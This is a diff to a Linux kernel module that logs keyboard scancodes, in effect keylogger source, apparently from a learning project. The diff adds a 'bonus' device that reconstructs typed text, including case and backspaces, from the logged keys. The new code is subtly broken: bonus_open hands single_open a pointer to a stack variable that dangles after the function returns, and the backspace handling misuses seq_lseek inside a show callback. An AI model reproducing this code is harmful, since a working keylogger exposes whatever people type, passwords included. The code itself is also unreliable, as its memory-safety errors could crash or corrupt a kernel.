@@ -194,22 +194,11 @@ static int	open_key(struct inode *node, struct file *file)
 	return single_open(file, &key_prepare_show, NULL);
 }
 
-static int	release_key(struct inode *node, struct file *file)
-{
-	int		ret;
-
-	pr_info("device closed\n");
-	spin_lock(&slock);
-	ret = single_release(node, file);
-	spin_unlock(&slock);
-	return ret;
-}
-
 static const struct file_operations ops = {
 	.owner = THIS_MODULE,
 	.open = open_key,
 	.read = seq_read,
-	.release = release_key,
+	.release = single_release,
 	.llseek = seq_lseek,
 };
 
@@ -221,18 +210,42 @@ static struct miscdevice		dev = {
 
 /* ****************************** BONUS DEVICE ****************************** */
 
+struct bonus_pack {
+	struct seq_file		*seq;
+	struct file		*file;
+};
+
+static void		bonus_iterate(struct key_log_entry *log, void *ptr)
+{
+	struct bonus_pack	*pack = ptr;
+	char			ascii;
+
+	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
+	if (ascii == '\b') {
+		seq_lseek(pack->file, -1, SEEK_CUR);
+	} else if (isprint(ascii) || ascii == '\n')
+		seq_putc(pack->seq, ascii);
+}
+
 static int		bonus_show(struct seq_file *seq, void *ptr)
 {
+	struct bonus_pack	*pack = ptr;
+
+	pack->seq = seq;
+	key_log_iter(bonus_iterate, pack);
 	return 0;
 }
 
 static int		bonus_open(struct inode *node, struct file *file)
 {
-	int	ret;
+	int			ret;
+	struct bonus_pack	pack;
 
+	pack.seq = NULL;
+	pack.file = file;
 	file->private_data = NULL;
 	spin_lock(&slock);
-	ret = single_open(file, bonus_show, NULL);
+	ret = single_open(file, bonus_show, &pack);
 	spin_unlock(&slock);
 	return ret;
 }
@@ -241,6 +254,7 @@ static const struct file_operations ops_bonus = {
 	.owner = THIS_MODULE,
 	.open = bonus_open,
 	.read = seq_read,
+	.llseek = seq_lseek,
 	.release = single_release
 };
 
@@ -254,9 +268,9 @@ static struct miscdevice		dev_bonus = {
 
 static void		key_job(struct work_struct *work)
 {
-	unsigned int		scancode = task->scancode;
 	struct key_task		*task = (struct key_task *)work;
 	struct key_map		*key;
+	unsigned int		scancode = task->scancode;
 
 	spin_lock(&slock);
 	key = get_key(scancode & 0x7f);
